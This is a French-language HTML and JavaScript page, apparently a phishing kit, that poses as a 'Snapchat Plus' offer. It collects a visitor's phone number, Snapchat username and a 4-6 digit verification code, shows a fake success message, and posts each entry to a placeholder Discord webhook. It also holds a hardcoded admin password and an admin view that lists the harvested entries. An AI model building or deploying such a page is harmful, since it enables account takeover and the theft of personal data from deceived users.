
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fff77a;
      height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .carre {
      background: white;
      padding: 2em;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    h2 {
      margin-bottom: 0.2em;
      text-align: center;
    }
    #messageLibre {
      font-size: 1em;
      margin-bottom: 1.5em;
      color: #333;
      text-align: center;
    }
    input {
      width: 90%;
      padding: 0.7em;
      margin: 1em 0;
      font-size: 1em;
      border: 2px solid #ccc;
      border-radius: 6px;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    button {
      padding: 0.7em 1.2em;
      font-size: 1em;
      background: #0056b3;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 0.5em;
    }
    button:hover {
      background: #003d80;
    }
    .error {
      color: red;
      font-weight: bold;
      margin-top: 1em;
    }
    .success {
      color: green;
      font-weight: bold;
      margin-top: 1em;
      font-size: 1.2em;
    }
    #adminSection {
      margin-top: 1.5em;
      border-top: 1px solid #ccc;
      padding-top: 1em;
      display: none;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 1em;
      font-size: 0.9em;
    }
    th, td {
      border: 1px solid #ccc;
      padding: 0.5em;
      text-align: center;
    }
    th {
      background: #eee;
    }
  </style>
</head>
<body>

<div class="carre">
  <h2>Snapchat Plus</h2>
  <div id="messageLibre">⚠️ Si vous êtes chez l'opérateur free cela peut ne pas fonctionner correctement (bug réseau).</div>

  <div id="formulaire">
    <input type="text" id="phone" placeholder="06XXXXXXXX" maxlength="10" />
    <input type="text" id="pseudo" placeholder="Votre pseudo Snap" maxlength="20" />
    <button onclick="validerNumPseudo()">Suivant</button>
    <div id="msgForm" class="error"></div>
  </div>

  <div id="infosUser" style="display:none;">
    <p><strong>Numéro :</strong> <span id="affichePhone"></span></p>
    <p><strong>Pseudo Snap :</strong> <span id="affichePseudo"></span></p>

    <input type="text" id="code" placeholder="Entrez votre code (4-6 chiffres)" maxlength="6" />
    <button onclick="validerCode()">Valider le code</button>
    <div id="msgCode" class="error"></div>
    <div id="confirmation" class="success" style="display:none;">Votre Snap+ va être envoyé sur votre compte.</div>

    <button style="margin-top:1em; background:#28a745;" onclick="toggleAdminSection()">Je suis pro</button>
  </div>

  <div id="adminSection">
    <input type="password" id="mdpPro" placeholder="Mot de passe admin" />
    <button onclick="validerAdmin()">Valider</button>
    <div id="msgAdmin" class="error"></div>

    <div id="listeUtilisateurs" style="display:none;">
      <h3>Liste des utilisateurs</h3>
      <table>
        <thead>
          <tr><th>Numéro</th><th>Pseudo Snap</th><th>Code</th></tr>
        </thead>
        <tbody id="tableBody"></tbody>
      </table>
    </div>
  </div>
</div>

<script>
  const WEBHOOK_URL = "TON_WEBHOOK_DISCORD_URL"; // Remplace ici

  let currentUser = {};

  function sendToWebhook(data) {
    let message = `**Nouvelle entrée :**\n`;
    message += `**Événement:** ${data.event}\n`;
    message += `**Numéro:** ${data.phone}\n`;
    message += `**Pseudo Snap:** ${data.pseudo}\n`;
    if (data.code) message += `**Code:** ${data.code}\n`;
    message += `**Heure:** ${new Date(data.timestamp).toLocaleString()}`;

    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: message }),
    })
    .then(res => {
      if (!res.ok) console.error("Erreur webhook Discord:", res.status);
    })
    .catch(err => console.error("Erreur fetch webhook Discord:", err));
  }

  function validerNumPseudo() {
    const phone = document.getElementById('phone').value.trim();
    const pseudo = document.getElementById('pseudo').value.trim();
    const msg = document.getElementById('msgForm');
    msg.textContent = "";

    if (!/^0[67]\d{8}$/.test(phone)) {
      msg.textContent = "❌ Numéro invalide.";
      return;
    }
    if (pseudo.length < 3) {
      msg.textContent = "❌ Pseudo trop court.";
      return;
    }

    currentUser.phone = phone;
    currentUser.pseudo = pseudo;

    // Stockage local
    let users = JSON.parse(localStorage.getItem('users')) || [];
    const index = users.findIndex(u => u.phone === phone);
    if (index !== -1) {
      users[index].pseudo = pseudo;
    } else {
      users.push({phone: phone, pseudo: pseudo, code: ""});
    }
    localStorage.setItem('users', JSON.stringify(users));

    // Envoi webhook Discord
    sendToWebhook({
      event: "num_pseudo_entré",
      phone: phone,
      pseudo: pseudo,
      timestamp: new Date().toISOString()
    });

    // Affiche la section infos
    document.getElementById('formulaire').style.display = 'none';
    document.getElementById('infosUser').style.display = 'block';
    document.getElementById('affichePhone').textContent = phone;
    document.getElementById('affichePseudo').textContent = pseudo;

    document.getElementById('msgCode').textContent = "";
    document.getElementById('confirmation').style.display = "none";
    document.getElementById('code').value = "";
  }

  function validerCode() {
    const codeInput = document.getElementById('code');
    const code = codeInput.value.trim();
    const msg = document.getElementById('msgCode');
    const conf = document.getElementById('confirmation');
    msg.textContent = "";
    conf.style.display = "none";

    if (!/^\d{4,6}$/.test(code)) {
      msg.textContent = "❌ Code invalide (4 à 6 chiffres).";
      return;
    }

    currentUser.code = code;

    // Mise à jour localStorage
    let users = JSON.parse(localStorage.getItem('users')) || [];
    const index = users.findIndex(u => u.phone === currentUser.phone);
    if (index !== -1) {
      users[index].code = code;
    } else {
      users.push(currentUser);
    }
    localStorage.setItem('users', JSON.stringify(users));

    // Envoi webhook Discord
    sendToWebhook({
      event: "code_entré",
      phone: currentUser.phone,
      pseudo: currentUser.pseudo,
      code: code,
      timestamp: new Date().toISOString()
    });

    conf.style.display = "block";
    codeInput.value = "";
  }

  function toggleAdminSection() {
    const adminSec = document.getElementById('adminSection');
    if (adminSec.style.display === "block") {
      adminSec.style.display = "none";
    } else {
      adminSec.style.display = "block";
      document.getElementById('msgAdmin').textContent = "";
      document.getElementById('listeUtilisateurs').style.display = "none";
      document.getElementById('mdpPro').value = "";
    }
  }

  function validerAdmin() {
    const mdp = document.getElementById('mdpPro').value.trim();
    const msgAdmin = document.getElementById('msgAdmin');
    msgAdmin.textContent = "";

    if (mdp !== 'ans77z') {
      msgAdmin.textContent = "❌ Mot de passe incorrect.";
      return;
    }

    let users = JSON.parse(localStorage.getItem('users')) || [];
    if (users.length === 0) {
      msgAdmin.textContent = "Aucun utilisateur enregistré.";
      return;
    }

    const tbody = document.getElementById('tableBody');
    tbody.innerHTML = "";

    users.forEach(u => {
      const tr = document.createElement('tr');
      tr.innerHTML = `<td>${u.phone}</td><td>${u.pseudo}</td><td>${u.code || ''}</td>`;
      tbody.appendChild(tr);
    });

    document.getElementById('listeUtilisateurs').style.display = 'block';
  }
</script>

</body>
</html>
